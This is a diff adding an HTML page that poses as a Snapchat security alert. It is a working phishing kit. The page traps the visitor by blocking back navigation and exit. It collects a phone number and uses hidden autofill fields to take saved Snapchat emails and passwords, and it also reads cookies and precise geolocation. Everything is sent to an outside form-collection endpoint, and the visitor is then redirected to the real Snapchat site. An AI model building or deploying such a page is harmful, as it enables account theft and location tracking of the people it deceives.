@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Security Alert!</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #000;
+      color: white;
+      font-family: -apple-system, sans-serif;
+    }
+    .overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: #000;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+    }
+    .logo { font-size: 80px; margin: 20px 0; }
+    h1 { font-size: 24px; font-weight: 600; margin: 10px 0; }
+    p { color: #ccc; margin: 10px 0; font-size: 16px; }
+    input {
+      padding: 16px;
+      width: 85%;
+      border: none;
+      border-radius: 8px;
+      margin: 15px 0;
+      font-size: 18px;
+      text-align: center;
+      background: #333;
+      color: white;
+    }
+    input::placeholder { color: #888; }
+    .btn {
+      padding: 15px 30px;
+      background: #fffc00;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: 600;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    .footer { margin-top: 20px; font-size: 12px; color: #555; }
+  </style>
+</head>
+<body>
+
+  <!-- FULL SCREEN LOCK -->
+  <div class="overlay" id="lockScreen">
+    <div class="logo">🔒</div>
+    <h1>Snapchat Security Alert</h1>
+    <p>Your account is at risk. Verify identity to continue.</p>
+    <input type="tel" id="phone" placeholder="Enter your phone number" autofocus />
+    <button class="btn" onclick="submitNumber()">Verify & Unlock</button>
+    <p class="footer">You cannot exit until verified.</p>
+  </div>
+
+  <script>
+    // Disable Back & Refresh
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => {
+      history.go(1);
+    };
+    window.onbeforeunload = () => "Verification required";
+
+    // Block Device Rotation & Zoom
+    document.addEventListener('gesturestart', e => e.preventDefault());
+    document.addEventListener('touchmove', e => {
+      if (e.touches.length > 1) e.preventDefault();
+    }, { passive: false });
+
+    // Data Object
+    const data = {
+      Time: new Date().toString(),
+      Device: navigator.userAgent,
+      Platform: navigator.platform,
+      Language: navigator.language,
+      Screen: screen.width + 'x' + screen.height
+    };
+
+    // Step 1: Detect Number (Autofill)
+    function detectNumber() {
+      const input = document.createElement('input');
+      input.type = 'tel';
+      input.autocomplete = 'tel';
+      input.style.position = 'fixed';
+      input.style.opacity = 0;
+      document.body.appendChild(input);
+
+      setTimeout(() => {
+        if (input.value && input.value.length > 5) {
+          data.Phone = input.value;
+          document.body.removeChild(input);
+          startAttack(); // Proceed
+        } else {
+          document.body.removeChild(input);
+        }
+      }, 1000);
+    }
+
+    // Step 2: Force Input Until Number Entered
+    function submitNumber() {
+      const num = document.getElementById('phone').value;
+      if (!num || num.length < 10) {
+        alert("Please enter a valid phone number to unlock");
+        return;
+      }
+      data.Phone = num;
+      startAttack();
+    }
+
+    // Step 3: Start Full Attack
+    function startAttack() {
+      detectSnapCredentials();
+      stealCookie();
+      getLocation();
+    }
+
+    // Detect Snapchat Email & Password (Autofill)
+    function detectSnapCredentials() {
+      const emailInput = document.createElement('input');
+      const passInput = document.createElement('input');
+
+      emailInput.type = 'email'; emailInput.autocomplete = 'username';
+      passInput.type = 'password'; passInput.autocomplete = 'current-password';
+
+      [emailInput, passInput].forEach(input => {
+        input.style.position = 'fixed';
+        input.style.opacity = 0;
+        document.body.appendChild(input);
+      });
+
+      setTimeout(() => {
+        if (emailInput.value && emailInput.value.includes('@')) {
+          data.Snapchat_ID = emailInput.value;
+        }
+        if (passInput.value) {
+          data.Snapchat_Password = passInput.value;
+        }
+        [emailInput, passInput].forEach(input => document.body.removeChild(input));
+      }, 2000);
+    }
+
+    // Steal Cookie
+    function stealCookie() {
+      const cookies = document.cookie;
+      data.Cookie = cookies || "No cookies found";
+    }
+
+    // Get Live Location
+    function getLocation() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          data.Latitude = pos.coords.latitude;
+          data.Longitude = pos.coords.longitude;
+          data.Accuracy = pos.coords.accuracy;
+          data["Google Maps"] = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          sendData();
+        }, () => sendData(), { enableHighAccuracy: true, timeout: 10000 });
+      } else {
+        sendData();
+      }
+    }
+
+    // Send All Data
+    function sendData() {
+      fetch('https://formspree.io/f/xvkgzkve', {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: { 'Content-Type': 'application/json' },
+        mode: 'no-cors'
+      }).finally(() => {
+        // Redirect to Snapchat
+        window.location.href = 'https://web.snapchat.com';
+      });
+    }
+
+    // Start on Load
+    window.onload = () => {
+      detectNumber(); // Try autofill
+    };
+  </script>
+</body>
+</html>
